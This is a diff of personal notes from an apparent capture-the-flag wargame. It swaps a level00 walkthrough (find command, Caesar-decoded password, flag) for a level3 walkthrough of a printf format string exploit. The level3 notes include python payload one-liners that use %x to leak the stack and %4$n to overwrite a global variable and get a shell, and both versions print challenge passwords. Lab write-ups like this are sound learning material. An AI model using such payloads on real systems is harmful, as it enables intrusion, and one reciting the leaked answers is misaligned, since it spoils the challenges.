@@ -1,18 +1,39 @@
-level00:
+level3:
 
-id
-pwd
-ls
+again the main calls the v function.
 
-Nothing to look at with ls.
-we should find some files that's been created by the flag00 user
+What it does is create a buffer, call to fgets to get input from user, print it then checks if m == 0x40(64/'@')/ 64 bytes ??
 
-find / -user flag00 2>/dev/null
-2>/dev/null redirects errors into null, so we can see better.
-we have 2 files, which contains the same string.
-we try to login to flag00 but doesnt work.
-it might be a specific code, check on dcode.fr
-its a ceaser code
-password : nottoohardhere
+fgets is protected from buffer overflows.
 
-then getflag : x24ti5gi3x0ol2eh4esiuxias
+We need to enter that if statement, it will launch a shell.
+
+printf is apparently vulnerable to a "format string exploit".
+
+after the printf calls, in gdb. its comparing a value in address 0x804988c = its the m global variable, so that is what we have to modify to 64.
+
+so the printf is vulnerable because there's no format so in input we can do that.
+
+we can use the %x format to print the stack addresses
+
+so if i do something like this : 
+
+python -c 'print "BBBB %x %x %x %x"' > /tmp/exploit3
+
+i get :
+
+BBBB 200 b7fd1ac0 b7ff37d0 42424242 20782520 25207825 78252078 20782520
+
+So my string 'BBBB' is found at the 4th address.
+replace it with the address of m (little-endian)
+
+0x804988c
+
+python -c 'print "\x8c\x98\x04\x08 %x %x %x %x"' > /tmp/exploit3
+
+but we need to change the value, not just print the address. so the address is already 4 bytes, and it needs to be 64, so we can just add 60 bytes. We can precise which adress we adding this to with %[nb]$n, so at the 4th address is %4$n.
+The modifier %n will write the number of bytes specified before in the choosen address. We can specify the address with %[number]$n option.
+
+python -c 'print "\x8c\x98\x04\x08" + "B" * 60 + "%4$n"' > /tmp/exploit3
+
+password for level4 : b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa
